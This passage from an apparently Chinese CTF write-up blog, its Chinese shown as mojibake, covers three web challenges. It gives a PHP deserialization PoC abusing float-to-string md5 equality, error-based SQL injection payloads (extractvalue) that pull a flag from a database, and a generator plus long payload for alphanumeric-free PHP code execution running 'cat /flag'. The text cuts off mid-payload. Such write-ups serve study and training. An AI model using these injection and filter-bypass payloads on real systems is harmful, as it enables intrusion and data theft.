<h3 id="è§£é¢˜æ­¥éª¤-3"><a href="#è§£é¢˜æ­¥éª¤-3" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜ç»™æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (string)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ä½ å¤ªé•¿äº†"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize($_GET[<span class="string">'trick'</span>]);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¸»è¦åœ¨æœ¬åœ°æµ‹è¯•ï¼Œç»è¿‡æµ‹è¯•æ²¡æœ‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;trick1 &#x3D; (string)$this-&gt;trick1;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±èƒ½ç”¨æ•°ç»„ç›´æ¥ç»•è¿‡ï¼Œé—®é¢˜æ˜¯å¤šäº†è¿™ä¸€ä¸ªç‚¹ï¼Œæ¯”èµ›æ—¶å°±æ²¡è€ƒè™‘åˆ°ï¼Œèµ›åçªç„¶æƒ³åˆ°äº†ä¹‹å‰è¿™ä¸ªè€ƒç‚¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$a = <span class="number">1.000000000000001</span>;</span><br><span class="line">	$b = <span class="number">1.000000000000001</span>;</span><br><span class="line">	$a = (string)($a);</span><br><span class="line">	<span class="keyword">echo</span> $a;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> $b;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">	<span class="keyword">if</span>(strlen($a)&gt;<span class="number">5</span>||strlen($b)&gt;<span class="number">5</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"you are too long"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> md5($a);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> md5($b);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">	<span class="keyword">if</span>($a!==$b&amp;&amp;$a!=$b&amp;&amp;md5($a)==md5($b))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"good"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'no'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ¬åœ°æµ‹è¯•</p>
<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/12.png" class="">

<p>ç»•è¿‡äº†ï¼Œç›´æ¥ç¼–poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1=<span class="number">1.000000000000001</span>;</span><br><span class="line">    <span class="keyword">public</span> $trick2=<span class="number">1.000000000000001</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>æŠŠç”Ÿæˆå¾—æ•°æ®ä¼ ç»™trickå°±å¯ä»¥</p>
<img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/13.png" class="">

<h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>çŸ¥è¯†ç‚¹</p>
]]></content>
      <tags>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title>DASAugust</title>
    <url>/2020/09/05/DASAugust/</url>
    <content><![CDATA[<h2 id="å®‰æ’å¤§å­¦"><a href="#å®‰æ’å¤§å­¦" class="headerlink" title="å®‰æ’å¤§å­¦"></a>å®‰æ’å¤§å­¦<a id="more"></a></h2><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>SQLæŠ¥é”™æ³¨å…¥</li>
<li>æ³¨å…¥ç‚¹</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢</p>
<img src="/2020/09/05/DASAugust/1.png" class="">

<p>å¯ä»¥æ³¨å†Œï¼Œå¹¶ä¸”çœŸå®å‘é€é‚®ç®±æ¿€æ´»çš„é‚®ä»¶ï¼Œå¼€å§‹æ²¡æ³¨æ„è¿™é‡Œï¼Œåé¢å†è¯´</p>
<p>æ¿€æ´»ä¹‹åå°±å¯ä»¥ç™»å½•äº†</p>
<img src="/2020/09/05/DASAugust/2.png" class="">

<p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ•™åŠ¡ç³»ç»Ÿæœ‰å¾ˆå¤šçš„åŠŸèƒ½ï¼Œæ¯”èµ›é‚£å¤©æ‰¾äº†æŒºä¹…æ‰¾ä¸åˆ°åˆ©ç”¨çš„åœ°æ–¹ï¼Œ åˆæ²¡æœ‰åƒæ˜¯æ¨¡æ¿æ³¨å…¥çš„ç‚¹</p>
<p>èµ›åçœ‹å¸ˆå‚…çš„wpå°±æ˜¯åœ¨å‰é¢çš„å‘é€é‚®ç®±æ¿€æ´»çš„åœ°æ–¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10048&#x2F;doAction.php?act&#x3D;active&amp;username&#x3D;pegggg&amp;token&#x3D;6011b0c07969fccb63b51daeaf1a4180</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„usernameå°±æ˜¯æ³¨å…¥ç‚¹ï¼Œä¹‹åå°±æ˜¯å¸¸è§„çš„æŠ¥é”™æ³¨å…¥ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹æ•°æ®åº“</p>
<img src="/2020/09/05/DASAugust/3.png" class="">

<p>ä¸‹é¢å°±æ˜¯çœ‹è¡¨å’Œåˆ—åäº†</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">å…ˆæŸ¥è¡¨å</span><br><span class="line">1'and extractvalue(0x0a,concat(0x0a,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())))<span class="comment">--+</span></span><br><span class="line"><span class="comment">#XPATH syntax error: ' student,teachers,users'</span></span><br><span class="line"></span><br><span class="line">å¯ä»¥çœ‹åˆ°æœ‰ä¸‰ä¸ªè¡¨ï¼Œä¸€ä¸ªä¸ªçœ‹</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">'and extractvalue(0x0a,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_name='</span><span class="keyword">users</span><span class="string">')))--+</span></span><br><span class="line"><span class="string">XPATH syntax error: '</span> <span class="keyword">id</span>,username,<span class="keyword">password</span>,ip,<span class="built_in">time</span>,US<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1'</span><span class="keyword">and</span> extractvalue(<span class="number">0x0a</span>,<span class="keyword">concat</span>(<span class="number">0x0a</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'teachers'</span>)))<span class="comment">--+</span></span><br><span class="line">XPATH syntax <span class="keyword">error</span>: <span class="string">' id,f1aaaag'</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">'and extractvalue(0x0a,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_name='</span>student<span class="string">')))--+</span></span><br><span class="line"><span class="string">XPATH syntax error: '</span> <span class="keyword">id</span>,username,age,sex<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ‰¾åˆ°äº†flagå­—æ®µï¼Œå°±æŸ¥teachersé‚£å¼ è¡¨å°±è¡Œ</span></span><br><span class="line"><span class="string">è¿™é‡Œå¾ˆæ˜æ˜¾æœ‰é•¿åº¦é™åˆ¶ï¼Œå¹¶ä¸”è¦æ³¨æ„ï¼Œè¿™é‡Œæœ‰å¾ˆå¤šå‡çš„flagæ•°æ®ï¼Œéœ€è¦é€æ¡æŸ¥è¯¢ï¼Œç”¨limit</span></span><br><span class="line"><span class="string">1'</span><span class="keyword">and</span> extractvalue(<span class="number">0x0a</span>,<span class="keyword">substr</span>((<span class="keyword">concat</span>(<span class="number">0x0a</span>,(<span class="keyword">select</span> f1aaaag <span class="keyword">from</span>  <span class="number">51</span>zxw.teachers <span class="keyword">limit</span> <span class="number">11</span>,<span class="number">1</span>))),<span class="number">1</span>,<span class="number">40</span>))<span class="comment">--+</span></span><br><span class="line">XPATH syntax <span class="keyword">error</span>: <span class="string">' DASCTF&#123;5af8b8860434db2184a427ee'</span></span><br><span class="line"><span class="number">1</span><span class="string">'and extractvalue(0x0a,substr((concat(0x0a,(select f1aaaag from  51zxw.teachers limit 11,1))),5,38))--+</span></span><br><span class="line"><span class="string">XPATH syntax error: '</span>af8b8860434db2184a427ee1fe6b845&#125;<span class="string">'</span></span><br></pre></td></tr></table></figure>

<img src="/2020/09/05/DASAugust/5.png" class="">

<img src="/2020/09/05/DASAugust/4.png" class="">

<p>æŠŠä¸Šé¢çš„ä¸¤éƒ¨åˆ†flagå»é‡æ‹¼æ¥å°±å¯ä»¥äº†</p>
<p>è¿™é‡Œä¹Ÿå¯ä»¥ç”¨reverseå€’å™è¾“å‡ºæ¥æ‹¿åˆ°åé¢éƒ¨åˆ†çš„flagï¼Œå†è¿›è¡Œæ‹¼æ¥</p>
<h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>æ— å­—æ¯æ•°å­—RCE</li>
<li>æ•°å­—æ„é€ </li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜æ”¾é€æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_POST[<span class="string">'code'</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'@'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>,<span class="string">'\['</span>,<span class="string">'\]'</span>,<span class="string">'\&amp;'</span>,<span class="string">'\?'</span>,<span class="string">'\&lt;'</span>,<span class="string">'\&gt;'</span>,<span class="string">'\*'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'0'</span>);</span><br><span class="line"><span class="comment">//This blacklist is so stupid.</span></span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'you are not smart'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"echo($code)"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ—¢ç„¶æ˜¯èµ›åå¤ç°ï¼Œé‚£è‚¯å®šæ˜¯çœ‹äº†wpçš„</p>
<p>è¿™é‡Œå¯ä»¥åˆ©ç”¨è¢«è¿‡æ»¤çš„å­—æ¯æ•°å­—å­˜æ”¾çš„æ•°ç»„æ¥è¿›è¡Œæ„é€ </p>
<p>æ­¤å¤–ï¼Œæ•°ç»„è‚¯å®šæ˜¯è¦æœ‰ä¸‹æ ‡çš„ï¼Œç„¶ååˆ©ç”¨é€’å¢å–åˆ°æƒ³è¦çš„å†…å®¹ï¼Œè¿™é‡Œç”¨çš„æ˜¯<code>(&quot;!=&quot;!=&quot;==&quot;)</code>ï¼Œè¿™æ˜¾ç¤ºä¸ºçœŸï¼Œphpä¸­æ‰“å°çš„ç»“æœä¸º1ï¼Œä¹‹åé€šè¿‡ç´¯åŠ å°±èƒ½æ‹¿åˆ°ä¸åŒçš„æ•°å­—äº†ï¼Œç›´æ¥ä¸Šexp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line"><span class="keyword">list</span> =[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'@'</span>,<span class="string">'~'</span>,<span class="string">'^'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">'&amp;'</span>,<span class="string">'?'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'*'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'0'</span>]</span><br><span class="line">long = len(<span class="keyword">list</span>)</span><br><span class="line">str1 = <span class="string">'system'</span></span><br><span class="line">str2 = <span class="string">'cat /flag'</span></span><br><span class="line">strings=<span class="string">''</span></span><br><span class="line">strings += <span class="string">"$__="</span></span><br><span class="line"><span class="keyword">for</span> j in str1:</span><br><span class="line">    <span class="keyword">if</span> j in <span class="keyword">list</span>:</span><br><span class="line">        strings += <span class="string">'$_&#123;'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">list</span>.index(j) ==<span class="number">0</span>:</span><br><span class="line">            strings += <span class="string">'("!="!="!=")&#125;.'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i in range(<span class="number">0</span>,<span class="keyword">list</span>.index(j)):</span><br><span class="line">                strings += <span class="string">'("!="!="==")+'</span></span><br><span class="line">            strings = strings[:<span class="number">-1</span>]</span><br><span class="line">            strings += <span class="string">'&#125;.'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        strings+=<span class="string">"\""</span>+j+<span class="string">"\"."</span></span><br><span class="line">    </span><br><span class="line">strings=strings[:<span class="number">-1</span>]+<span class="string">');'</span></span><br><span class="line"></span><br><span class="line">strings += <span class="string">"$___="</span></span><br><span class="line"><span class="keyword">for</span> j in str2:</span><br><span class="line">    <span class="keyword">if</span> j in <span class="keyword">list</span>:</span><br><span class="line">        strings += <span class="string">'$_&#123;'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">list</span>.index(j) ==<span class="number">0</span>:</span><br><span class="line">            strings += <span class="string">'("!="!="!=")&#125;.'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i in range(<span class="number">0</span>,<span class="keyword">list</span>.index(j)):</span><br><span class="line">                strings += <span class="string">'("!="!="==")+'</span></span><br><span class="line">            strings = strings[:<span class="number">-1</span>]</span><br><span class="line">            strings += <span class="string">'&#125;.'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        strings+=<span class="string">"\""</span>+j+<span class="string">"\"."</span></span><br><span class="line">    <span class="comment"># print(strings)</span></span><br><span class="line">strings=strings[:<span class="number">-1</span>]+<span class="string">';'</span></span><br><span class="line"></span><br><span class="line">strings += <span class="string">'$__($___);//'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(strings)</span><br></pre></td></tr></table></figure>

<p>è¿˜æ˜¯å¾ˆå¥½æ‡‚çš„ï¼Œè¿™é‡Œå°±ä¸è§£é‡Šäº†ï¼Œpayload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$__&#x3D;$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;);$___&#x3D;$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;!&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&qu